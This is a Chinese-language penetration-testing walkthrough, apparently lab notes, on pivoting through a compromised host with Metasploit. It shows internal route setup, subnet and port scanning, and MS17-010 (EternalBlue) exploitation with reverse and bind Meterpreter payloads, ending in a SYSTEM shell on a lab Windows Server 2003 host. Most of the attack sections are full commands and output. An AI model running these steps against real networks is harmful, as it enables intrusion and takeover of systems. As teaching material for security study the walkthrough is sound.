[TOC]



# ==MSF内网扫描==

#### 一、内网路由

当获取到跳板机权限后，如何在MSF中利用跳板机完成对内网的扫描和漏洞利用，便是接下来一个重要的话题。

##### 1、确定内网所在网段

```
首先进入Meterpreter的Shell中，直接运行跳板机命令：ipconfig，可以获取各个网卡的网址和所在网关，进而基本确定其网段

再运行arp -a命令，查看ARP缓存表，确定被注入木马的服务器曾访问过的IP地址和网段
接口: 192.168.112.210 --- 0x6  
Internet 地址         物理地址              类型  
192.168.112.1         00-50-56-c0-00-08     动态  
192.168.112.2         00-50-56-f4-64-3a     动态  
192.168.112.186       00-0c-29-fd-b9-7e     动态  
192.168.112.201       00-0c-29-ca-17-cf     动态  
192.168.112.254       00-50-56-e7-1f-92     动态  
192.168.112.255       ff-ff-ff-ff-ff-ff     静态  
224.0.0.22            01-00-5e-00-00-16     静态  
224.0.0.252           01-00-5e-00-00-fc     静态  
239.192.168.19        01-00-5e-40-a8-13     静态  
239.255.255.250       01-00-5e-7f-ff-fa     静态  
255.255.255.255       ff-ff-ff-ff-ff-ff     
静态接口: 192.168.19.106 --- 0x7  
Internet 地址         物理地址              类型  
192.168.19.1          54-2b-de-32-48-f0     动态  
192.168.19.11         a0-e7-0b-c9-ff-ae     动态  
192.168.19.107        00-0c-29-5e-0a-00     动态  
192.168.19.255        ff-ff-ff-ff-ff-ff     静态  
224.0.0.22            01-00-5e-00-00-16     静态  
224.0.0.252           01-00-5e-00-00-fc     静态  
224.0.0.253           01-00-5e-00-00-fd     静态  
239.192.168.19        01-00-5e-40-a8-13     静态  
239.255.255.250       01-00-5e-7f-ff-fa     静态  
255.255.255.255       ff-ff-ff-ff-ff-ff     静态

进而配合跳板机IP地址信息，可以基本确定 192.168.112.186、192.168.112.201、192.168.19.11、192.168.19.107等主机是存在于网段中的存活主机，但是该操作只是缓存信息，且并不是全部存活主机，所以最好再利用MSF进行一下内网存活主机的网段全扫描。
```

##### 2、配置内网路由

如果要利用MSF进行内网扫描，则必须确保MSF能够通过跳板机访问到内网，此时，可以通过配置内网路由来解决问题。

（1）第一步：获取内网网段

进入Meterpreter命令行，运行以下指令获取内网所在网段

```
meterpreter > run get_local_subnets

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 10.10.10.0/255.255.255.0
Local subnet: 10.10.100.0/255.255.255.0
```

![image-20240930163925852](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240930163925852.png)

（2）第二步：添加内网路由

```
meterpreter > run post/multi/manage/autoroute 

[*] Running module against WIN-0ABFG2SMHNR
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.10.10.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 10.10.100.0/255.255.255.0 from host's routing table.
```

![image-20240930165322275](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240930165322275.png)

（3）第三步：确认路由添加成功

```
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 86
   10.10.100.0        255.255.255.0      Session 86
```

![image-20240930165357011](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240930165357011.png)

> 也可以在MSF提示符下，运行：route print 查看路由表（如果要用的话，请在Meterpreter中使用background退回到MSF提示符，而不是exit，方便使用 session 再使用 meterpreter ），木马连接一旦断开，则无法再使用内网路由进入内网。

（4）第四步：手工添加路由

对于某些Payload，可能无法自动扫描和识别出内网所在网段，此时在运行了ipconfig获取网段后手工添加

```
在Meterpreter中直接运行：
run autoroute -s 192.168.112.0/24

或者：

在MSF提示符下使用： 
route add 添加路由
如route add 192.168.112.0/24 1 (1代表的是Session ID，也就是与 kali 连接的 木马的 ID)在MSF提示符下查看路由：route print
```

#### 二、内网扫描

> ### 一、工作原理
>
> - **udp_sweep**：通过发送UDP数据包来探查指定主机是否活跃，并发现主机上的UDP服务。这种扫描方式利用了UDP协议的特性，通过发送数据包并观察是否收到响应来判断主机的状态和服务情况。
> - **udp_probe**：虽然udp_probe的具体工作原理可能因Metasploit的版本和配置而有所不同，但一般来说，它也涉及到发送UDP数据包来探测目标主机的某些特性或服务。然而，与udp_sweep相比，udp_probe可能更侧重于对特定服务或端口的探测，而不是简单地判断主机的活跃性。
>
> ### 二、应用场景
>
> - **udp_sweep**：更适用于快速发现网络中的活跃主机和它们提供的UDP服务。这对于网络安全人员来说是一个重要的信息收集过程，有助于了解网络的整体情况和潜在的安全风险。
> - **udp_probe**：可能更适用于对特定服务或端口的详细探测，例如检查某个服务是否正在运行、是否存在漏洞等。这种扫描方式对于漏洞评估和安全测试来说非常有用。

##### 1、IP地址存活扫描

可以使用以下模块进行内网IP地址扫描：

```
auxiliary/scanner/discovery/arp_sweep    #基于arp协议发现内网存活主机，这不能通过代理使用
auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
```

此处以 auxiliary/scanner/discovery/udp_probe 进行全网段扫描，结果如下（时间会比较久）：

```
msf6 > use auxiliary/scanner/discovery/udp_probe msf6 auxiliary(scanner/discovery/udp_probe) > set rhosts 10.10.10.1/24rhosts => 10.10.10.1/24msf6 auxiliary(scanner/discovery/udp_probe) > set threads 5threads => 5msf6 auxiliary(scanner/discovery/udp_probe) > run[*] Scanned  26 of 256 hosts (10% complete)[*] Scanned  52 of 256 hosts (20% complete)[*] Scanned  79 of 256 hosts (30% complete)[*] Scanned 103 of 256 hosts (40% complete)[*] Scanned 128 of 256 hosts (50% complete)[+] Discovered NetBIOS on 10.10.10.136:137 (GOD-111:<00>:U :WORKGROUP:<00>:G :GOD-111:<20>:U :WORKGROUP:<1e>:G :WORKGROUP:<1d>:U :__MSBROWSE__:<01>:G :00:0c:29:ca:17:cf)[+] Discovered NetBIOS on 10.10.10.138:137 (WINSEVEN:<00>:U :WORKGROUP:<00>:G :WINSEVEN:<20>:U :WORKGROUP:<1e>:G :00:0c:29:fd:b9:7e)[*] Scanned 154 of 256 hosts (60% complete)[*] Scanned 180 of 256 hosts (70% complete)[*] Scanned 205 of 256 hosts (80% complete)[*] Scanned 231 of 256 hosts (90% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed此处发现了 10.10.10.136 和 10.10.10.138 两台主机，并初步确定了其主机名称和MAC地址,同时可以确认为工作站而非域主机。
```

再次以 auxiliary/scanner/discovery/udp_sweep 进行扫描，结果如下：

```
msf6 > use auxiliary/scanner/discovery/udp_sweepmsf6 auxiliary(scanner/discovery/udp_sweep) > set rhosts 10.10.10.130-145     # 注意此处，不再全网段扫描rhosts => 10.10.10.130-145msf6 auxiliary(scanner/discovery/udp_sweep) > run[*] Sending 13 probes to 10.10.10.130->10.10.10.145 (16 hosts)[*] Discovered NetBIOS on 10.10.10.136:137 (GOD-111:<00>:U :WORKGROUP:<00>:G :GOD-111:<20>:U :WORKGROUP:<1e>:G :WORKGROUP:<1d>:U :__MSBROWSE__:<01>:G :00:0c:29:ca:17:cf)[*] Discovered NetBIOS on 10.10.10.138:137 (WINSEVEN:<00>:U :WORKGROUP:<00>:G :WINSEVEN:<20>:U :WORKGROUP:<1e>:G :00:0c:29:fd:b9:7e)[*] Scanned 16 of 16 hosts (100% complete)[*] Auxiliary module execution completed
```

> 如果某个选项需要设置为空，则使用 unset 选项名 进行重置

根据MSF官方宣称，还可以使用：auxiliary/scanner/discovery/arp_sweep，但是实验表明该模块在跨网段方面无法完成扫描，但是扫描与跳板机连通的主IP地址同一网段还是比较准确的

```
msf6 auxiliary(scanner/discovery/udp_sweep) > use auxiliary/scanner/discovery/arp_sweep msf6 auxiliary(scanner/discovery/arp_sweep) > set rhosts 10.10.10.130-150      # 跨网段扫描结果rhosts => 10.10.10.130-150msf6 auxiliary(scanner/discovery/arp_sweep) > run[*] Scanned 21 of 21 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(scanner/discovery/arp_sweep) > set rhosts 192.168.0.100-200    # 同网段扫描结果rhosts => 192.168.0.100-200msf6 auxiliary(scanner/discovery/arp_sweep) > run[+] 192.168.0.105 appears to be up (UNKNOWN).[+] 192.168.0.165 appears to be up (VMware, Inc.).[+] 192.168.0.177 appears to be up (UNKNOWN).[*] Scanned 101 of 101 hosts (100% complete)[*] Auxiliary module execution completed
```

##### 2、内网端口扫描

可以使用以下模块扫描内网某个IP地址的端口

```
auxiliary/scanner/portscan/ack           # 基于tcp的ack回复进行端口扫描，默认扫描1-10000端口auxiliary/scanner/portscan/tcp           # 基于tcp进行端口扫描，默认扫描1-10000端口auxiliary/scanner/portscan/syn             # 基于tcp的syn进行端口扫描，默认扫描1-10000端口
```

此处以TCP全连接扫描为例：

```
msf6 > use auxiliary/scanner/portscan/tcpmsf6 auxiliary(scanner/portscan/tcp) > set ports 80,445,135,139,3306,22,3389ports => 80,445,135,139,3306,22,3389msf6 auxiliary(scanner/portscan/tcp) > set threads 10threads => 10msf6 auxiliary(scanner/portscan/tcp) > set rhosts 10.10.10.138rhosts => 10.10.10.138msf6 auxiliary(scanner/portscan/tcp) > run[+] 10.10.10.138:         - 10.10.10.138:135 - TCP OPEN[+] 10.10.10.138:         - 10.10.10.138:3306 - TCP OPEN[+] 10.10.10.138:         - 10.10.10.138:80 - TCP OPEN[+] 10.10.10.138:         - 10.10.10.138:445 - TCP OPEN[+] 10.10.10.138:         - 10.10.10.138:3389 - TCP OPEN[+] 10.10.10.138:         - 10.10.10.138:139 - TCP OPEN[*] 10.10.10.138:         - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed
```

##### 3、服务探测

此处以探测SMB（445端口）服务为例：

```
msf6 > use auxiliary/scanner/smb/smb_versionmsf6 auxiliary(scanner/smb/smb_version) > set rhost 10.10.10.136rhost => 10.10.10.136msf6 auxiliary(scanner/smb/smb_version) > run[*] 10.10.10.136:445      - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)Windows 2003 SP2 (build:3790) (name:GOD-111) (workgroup:WORKGROUP)[+] 10.10.10.136:445      -   Host is running SMB Detected (versions:1) (preferred dialect:) (signatures:optional)Windows 2003 SP2 (build:3790) (name:GOD-111) (workgroup:WORKGROUP)[*] 10.10.10.136:         - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(scanner/smb/smb_version) > set rhost 10.10.10.138rhost => 10.10.10.138msf6 auxiliary(scanner/smb/smb_version) > run[*] 10.10.10.138:445      - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:1h 23m 3s) (guid:{70ae7951-fd8a-4fad-9d4c-6ea8c9bd3120}) (authentication domain:WINSEVEN)Windows 7 Ultimate SP1 (build:7601) (name:WINSEVEN) (workgroup:WORKGROUP)[+] 10.10.10.138:445      -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:1h 23m 3s) (guid:{70ae7951-fd8a-4fad-9d4c-6ea8c9bd3120}) (authentication domain:WINSEVEN)Windows 7 Ultimate SP1 (build:7601) (name:WINSEVEN) (workgroup:WORKGROUP)[*] 10.10.10.138:         - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed
```

其他服务探测模块如：

```
auxiliary/scanner/ftp/ftp_version        #发现内网ftp服务，基于默认21端口auxiliary/scanner/ssh/ssh_version        #发现内网ssh服务，基于默认22端口auxiliary/scanner/telnet/telnet_version  #发现内网telnet服务，基于默认23端口auxiliary/scanner/dns/dns_amp            #发现dns服务，基于默认53端口auxiliary/scanner/http/http_version      #发现内网http服务，基于默认80端口auxiliary/scanner/http/title             #探测内网http服务的标题auxiliary/scanner/smb/smb_version        #发现内网smb服务，基于默认的445端口   auxiliary/scanner/mssql/mssql_schemadump  #发现内网SQLServer服务,基于默认的1433端口auxiliary/scanner/oracle/oracle_hashdump  #发现内网oracle服务,基于默认的1521端口 auxiliary/scanner/mysql/mysql_version    #发现内网mysql服务，基于默认3306端口auxiliary/scanner/rdp/rdp_scanner        #发现内网RDP服务，基于默认3389端口auxiliary/scanner/redis/redis_server     #发现内网Redis服务，基于默认6379端口auxiliary/scanner/db2/db2_version        #探测内网的db2服务，基于默认的50000端口auxiliary/scanner/netbios/nbname         #探测内网主机的netbios名字
```

#### 三、漏洞利用

##### 1、尝试利用永恒之蓝漏洞执行单条命令

```
msf6 auxiliary(scanner/smb/smb_version) > use auxiliary/admin/smb/ms17_010_command
msf6 auxiliary(admin/smb/ms17_010_command) > set rhosts 10.10.10.136
rhosts => 10.10.10.136
msf6 auxiliary(admin/smb/ms17_010_command) > set command ipconfig
command => ipconfig
msf6 auxiliary(admin/smb/ms17_010_command) > run
[*] 10.10.10.136:445      - Target OS: Windows Server 2003 3790 Service Pack 2
[*] 10.10.10.136:445      - Filling barrel with fish... done
[*] 10.10.10.136:445      - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.136:445      -     
[*] Preparing dynamite...
[*] 10.10.10.136:445      -             Trying stick 1 (x64)...Miss
[*] 10.10.10.136:445      -             
[*] Trying stick 2 (x86)...Boom!
[*] 10.10.10.136:445      -     
[+] Successfully Leaked Transaction!
[*] 10.10.10.136:445      -     
[+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.136:445      - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.136:445      - Reading from CONNECTION struct at: 0x874fbd48
[*] 10.10.10.136:445      - Built a write-what-where primitive...
[+] 10.10.10.136:445      - Overwrite complete... SYSTEM session obtained!
[+] 10.10.10.136:445      - Service start timed out, OK if running a command or non-service executable...
[*] 10.10.10.136:445      - Getting the command output...
[*] 10.10.10.136:445      - Executing cleanup...
[+] 10.10.10.136:445      - Cleanup was successful
[+] 10.10.10.136:445      - Command completed successfully!
[*] 10.10.10.136:445      - Output for "ipconfig":Windows IP Configuration
Ethernet adapter ��������:   Connection-specific DNS Suffix  . : localdomain   IP Address. . . . . . . . . . . . : 10.10.10.136   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 
[*] 10.10.10.136:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

##### 2、尝试利用永恒之蓝获取控制权

```
msf6 auxiliary(admin/smb/ms17_010_command) > use exploit/windows/smb/ms17_010_psexec [*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms17_010_psexec) > set rhost 10.10.10.136rhost => 10.10.10.136msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 192.168.0.183lhost => 192.168.0.183msf6 exploit(windows/smb/ms17_010_psexec) > run[-] Handler failed to bind to 192.168.0.183:4444:-  -[*] Started reverse TCP handler on 0.0.0.0:4444 [*] 10.10.10.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2[*] 10.10.10.136:445 - Filling barrel with fish... done[*] 10.10.10.136:445 - <---------------- | Entering Danger Zone | ---------------->[*] 10.10.10.136:445 -  [*] Preparing dynamite...[*] 10.10.10.136:445 -          Trying stick 1 (x64)...Miss[*] 10.10.10.136:445 -          [*] Trying stick 2 (x86)...Boom![*] 10.10.10.136:445 -  [+] Successfully Leaked Transaction![*] 10.10.10.136:445 -  [+] Successfully caught Fish-in-a-barrel[*] 10.10.10.136:445 - <---------------- | Leaving Danger Zone | ---------------->[*] 10.10.10.136:445 - Reading from CONNECTION struct at: 0x87ddf100[*] 10.10.10.136:445 - Built a write-what-where primitive...[+] 10.10.10.136:445 - Overwrite complete... SYSTEM session obtained![*] 10.10.10.136:445 - Selecting native target[*] 10.10.10.136:445 - Uploading payload... phtKuMmP.exe[*] 10.10.10.136:445 - Created \phtKuMmP.exe...[+] 10.10.10.136:445 - Service started successfully...[*] 10.10.10.136:445 - Deleting \phtKuMmP.exe...[*] Exploit completed, but no session was created.
```

此时，我们发现木马已经上传成功，但是并没有返回到Meterpreter，原因是10.10.10.136的主机并不能反向连接到Kali。

要确保，流量能通过 kali -> windows server 2016 -> win7 然后 win7 -> windows server 2016 -> kali

这样，kali才能进入 win7 的 meterpreter 命令行

##### 3、使用正向连接获取Meterpreter

也正是因为内网访问的路径不再与直连一致，但是我们既然可以利用Kali路由到目标主机，所以理论上来说，正向连接木马相对具有可行性一些。

```
msf6 auxiliary(admin/smb/ms17_010_command) > use exploit/windows/smb/ms17_010_psexec[*] Using configured payload windows/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms17_010_psexec) > msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/bind_tcppayload => windows/meterpreter/bind_tcpmsf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 10.10.10.136rhosts => 10.10.10.136msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 192.168.0.183lhost => 192.168.0.183msf6 exploit(windows/smb/ms17_010_psexec) > run[*] 10.10.10.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2[*] 10.10.10.136:445 - Filling barrel with fish... done[*] 10.10.10.136:445 - <---------------- | Entering Danger Zone | ---------------->[*] 10.10.10.136:445 -  [*] Preparing dynamite...[*] 10.10.10.136:445 -          Trying stick 1 (x64)...Miss[*] 10.10.10.136:445 -          [*] Trying stick 2 (x86)...Boom![*] 10.10.10.136:445 -  [+] Successfully Leaked Transaction![*] 10.10.10.136:445 -  [+] Successfully caught Fish-in-a-barrel[*] 10.10.10.136:445 - <---------------- | Leaving Danger Zone | ---------------->[*] 10.10.10.136:445 - Reading from CONNECTION struct at: 0x87c0ed48[*] 10.10.10.136:445 - Built a write-what-where primitive...[+] 10.10.10.136:445 - Overwrite complete... SYSTEM session obtained![*] 10.10.10.136:445 - Selecting native target[*] 10.10.10.136:445 - Uploading payload... DaxuwVYe.exe[*] 10.10.10.136:445 - Created \DaxuwVYe.exe...[+] 10.10.10.136:445 - Service started successfully...[*] 10.10.10.136:445 - Deleting \DaxuwVYe.exe...[*] Started bind TCP handler against 10.10.10.136:4444[*] Sending stage (175686 bytes) to 10.10.10.136[*] Meterpreter session 5 opened (10.10.10.141:50236 -> 10.10.10.136:4444 via session 2) at 2023-03-04 01:03:40 +0800meterpreter > sysinfoComputer        : GOD-111OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).Architecture    : x86System Language : zh_CNDomain          : WORKGROUPLogged On Users : 1Meterpreter     : x86/windows
```

成功获取内网目标的控制权。